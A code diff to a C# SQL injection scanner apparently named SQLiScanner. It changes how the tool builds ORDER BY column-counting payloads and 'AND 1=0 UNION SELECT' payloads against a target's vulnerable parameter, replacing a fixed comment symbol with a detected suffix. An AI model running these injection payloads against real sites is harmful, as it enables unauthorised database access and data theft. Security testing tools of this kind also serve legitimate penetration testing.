@@ -1,4 +1,5 @@
-﻿using SQLiScanner.Utility;
+﻿using SQLiScanner.Models;
+using SQLiScanner.Utility;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -33,12 +34,10 @@ namespace SQLiScanner.Modules
                 return -1;
             }
 
-            string comment = GetCommentSymbol(detectedData.DatabaseType);
-
             for (int i = 1; i <= 50; i++)
             {
                 // Payload: value' ORDER BY 1 -- 
-                string payload = $"{originalValue}{detectedData.WorkingPrefix} ORDER BY {i}{comment}";
+                string payload = $"{originalValue}{detectedData.WorkingPrefix} ORDER BY {i}{detectedData.WorkingSuffix}";
 
                 int currentLength = await GetResponseLengthAsync(target, detectedData.VulnerableParam, payload);
 
@@ -80,7 +79,6 @@ namespace SQLiScanner.Modules
 
             List<int> visibleCols = new List<int>();
             string fromTable = detectedData.DatabaseType == DbType.Oracle ? " FROM DUAL" : "";
-            string comment = GetCommentSymbol(detectedData.DatabaseType);
             string originalValue = target.Params[detectedData.VulnerableParam];
 
             for (int i = 0; i < colCount; i++)
@@ -93,7 +91,7 @@ namespace SQLiScanner.Modules
                 payloadParts[i] = magicString;
                 string unionPart = string.Join(",", payloadParts);
 
-                string payload = $"{originalValue}{detectedData.WorkingPrefix} AND 1=0 UNION SELECT {unionPart}{fromTable}{comment}";
+                string payload = $"{originalValue}{detectedData.WorkingPrefix} AND 1=0 UNION SELECT {unionPart}{fromTable}{detectedData.WorkingSuffix}";
 
                 try
                 {
@@ -189,12 +187,6 @@ namespace SQLiScanner.Modules
                 return bytes == null ? "" : System.Text.Encoding.UTF8.GetString(bytes);
             }
             catch { return ""; }
-        }
-
-        private string GetCommentSymbol(DbType dbType)
-        {
-            if (dbType == DbType.MySQL) return " %23";
-            return " -- ";
         }
         #endregion
     }
